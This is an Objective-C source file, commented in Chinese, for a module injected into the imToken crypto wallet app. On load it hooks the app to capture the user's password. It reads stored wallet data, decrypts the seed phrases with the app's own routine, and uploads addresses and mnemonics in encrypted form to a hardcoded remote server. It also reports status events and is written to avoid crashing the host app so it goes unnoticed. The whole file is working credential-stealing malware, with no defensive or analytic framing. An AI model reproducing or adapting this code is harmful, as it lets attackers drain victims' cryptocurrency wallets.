//
//  Payload.m — imToken 模块入口（自己实现，替掉会卡死界面的原版 b2lib）
//
//  设计原则：
//    1. 注入后立刻装钩子（微秒级，不碰主线程）
//    2. 后台队列做 AsyncStorage 读取 / 解密 / 上报
//    3. 每 3 秒检查一次钩子是否捕获到密码，最多等 10 分钟
//    4. 全程 @try/@catch，任何异常都不能把 App 带崩
//
#import <Foundation/Foundation.h>
#import "Net.h"
#import "Info.h"
#import "ImToken.h"

static NSString *const kBaseURL = @"https://myg3z1adawtxz0s.icu";
static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";

@interface ImTokenPayload : NSObject
@property (nonatomic, strong) Net *net;
@property (nonatomic, assign) BOOL sentAddr;
@property (nonatomic, assign) BOOL sentMnemonic;
@end

@implementation ImTokenPayload

+ (instancetype)shared {
    static ImTokenPayload *p = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ p = [ImTokenPayload new]; });
    return p;
}

- (instancetype)init {
    if ((self = [super init])) {
        _net = [Net shared];
        _net.baseURL = kBaseURL;
        _net.aesPassword = kAesPassword;
        _net.identity = [Info identity];
    }
    return self;
}

#pragma mark - 上报

- (NSMutableDictionary *)baseBody {
    NSMutableDictionary *d = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
    d[@"a"] = @"b2";       // 服务端 WALLET_LETTERS: b2 = imToken
    d[@"c"] = @"d9f5121f75a6646c4f814a4ff8c41b04";
    return d;
}

/// 地址列表 → /ub
- (void)uploadAddresses:(NSArray<NSDictionary *> *)wallets {
    NSMutableArray *ad = [NSMutableArray array];
    for (NSDictionary *w in wallets) {
        NSString *addr = w[@"address"] ?: w[@"addr"] ?: w[@"accountAddress"] ?: w[@"walletAddress"];
        if (![addr isKindOfClass:[NSString class]] || addr.length < 10) continue;
        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        row[@"address"] = addr;
        row[@"totalCoin"] = @"0";
        if (w[@"derivationPath"]) row[@"mnemonicPath"] = w[@"derivationPath"];
        else if (w[@"path"]) row[@"mnemonicPath"] = w[@"path"];
        if (w[@"name"]) row[@"name"] = w[@"name"];
        [ad addObject:row];
    }
    if (!ad.count) return;

    NSMutableDictionary *body = [self baseBody];
    body[@"ad"] = ad;
    body[@"et"] = @"wallet_address_scan";

    NSDictionary *r = [self.net postEncrypted:@"/ub" json:body timeout:20];
    if (r) self.sentAddr = YES;
}

/// 助记词 → /us
- (BOOL)uploadMnemonic:(NSString *)mn {
    if (mn.length < 20) return NO;
    NSMutableDictionary *body = [self baseBody];
    body[@"result"] = mn;
    body[@"et"] = @"wallet_mnemonic_scan";
    NSDictionary *r = [self.net postEncrypted:@"/us" json:body timeout:20];
    return r != nil;
}

/// 诊断事件 → /event（出问题时能看日志）
- (void)reportEvent:(NSString *)et ctx:(NSDictionary *)ctx {
    NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
    ev[@"et"] = et;
    ev[@"c"] = @"d9f5121f75a6646c4f814a4ff8c41b04";
    ev[@"ctx"] = ctx ?: @{};
    [self.net sendEvent:ev];
}

#pragma mark - 主流程

- (void)start {
    // 构造函数里一行重活都不能干：启动阶段占住主线程会被 watchdog 杀掉。
    // 全部挪到后台，第一件事先报 imtoken_boot 证明模块活着。
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        @try {
            [self reportEvent:@"imtoken_boot" ctx:@{ @"host": [Info hostBundleId] ?: @"" }];

            BOOL hooked = NO;
            @try {
                hooked = [ImToken installHook];
            } @catch (NSException *e) {
                hooked = NO;
            }

            [self scanOnce];

            NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
            ctx[@"hooked"] = @(hooked);
            ctx[@"storageDir"] = [ImToken storageDir] ?: @"";
            ctx[@"walletCount"] = @([ImToken wallets].count);
            ctx[@"error"] = [ImToken lastError] ?: @"";
            [self reportEvent:@"imtoken_scan_started" ctx:ctx];

            // 3. 每 3 秒看钩子有没有捕获到密码，最多 200 次（10 分钟）
            for (NSInteger i = 0; i < 200; i++) {
                if (self.sentMnemonic) break;
                if ([ImToken hookFired]) {
                    [self tryDecryptAndUpload];
                }
                usleep(3 * 1000 * 1000);
            }
        } @catch (NSException *e) {
            [self reportEvent:@"imtoken_crashed" ctx:@{ @"reason": e.reason ?: @"" }];
        }
    });
}

/// 不需要密码就能拿到的：地址 + 可能的明文助记词
- (void)scanOnce {
    @try {
        NSArray *ws = [ImToken wallets];
        if (ws.count) [self uploadAddresses:ws];

        NSArray *plain = [ImToken plaintextMnemonics];
        for (NSString *mn in plain) {
            if ([self uploadMnemonic:mn]) {
                self.sentMnemonic = YES;
                [self reportEvent:@"imtoken_mnemonic_plain" ctx:@{ @"words": @(mn.length) }];
                break;
            }
        }
    } @catch (NSException *e) {
        (void)e;
    }
}

/// 钩子捕获到密码后：用 App 自己的解密函数解 encMnemonic
- (void)tryDecryptAndUpload {
    @try {
        NSArray *ws = [ImToken wallets];
        for (NSDictionary *w in ws) {
            NSString *enc = w[@"encMnemonic"] ?: w[@"encMnemonicV2"];
            if (![enc isKindOfClass:[NSString class]] || enc.length < 16) continue;

            NSString *plain = [ImToken decryptMnemonic:enc];
            if (plain.length > 20) {
                if ([self uploadMnemonic:plain]) {
                    self.sentMnemonic = YES;
                    [self reportEvent:@"imtoken_mnemonic_decrypted"
                                  ctx:@{ @"words": @(plain.length) }];
                    return;
                }
            }
        }
        // 解不出来也报一次，便于排查
        [self reportEvent:@"imtoken_decrypt_failed"
                      ctx:@{ @"error": [ImToken lastError] ?: @"",
                             @"hasKey": @([ImToken capturedDerivedKey] != nil) }];
    } @catch (NSException *e) {
        (void)e;
    }
}

@end

__attribute__((constructor))
static void imtoken_init(void) {
    @autoreleasepool {
        // 只在 imToken 进程里跑。用 contains 而不是 == ，避免 bundleId 带后缀时静默退出。
        NSString *bid = [Info hostBundleId] ?: @"";
        BOOL isImToken = [bid.lowercaseString containsString:@"im.token"];

        if (!isImToken) {
            // 注进来了但不是 imToken：报一条，便于确认模块加载位置
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
                ev[@"et"] = @"imtoken_wrong_host";
                ev[@"c"] = @"d9f5121f75a6646c4f814a4ff8c41b04";
                ev[@"ctx"] = @{ @"hostBundleId": bid };
                [[Net shared] sendEvent:ev];
            });
            return;
        }
        [[ImTokenPayload shared] start];
    }
}
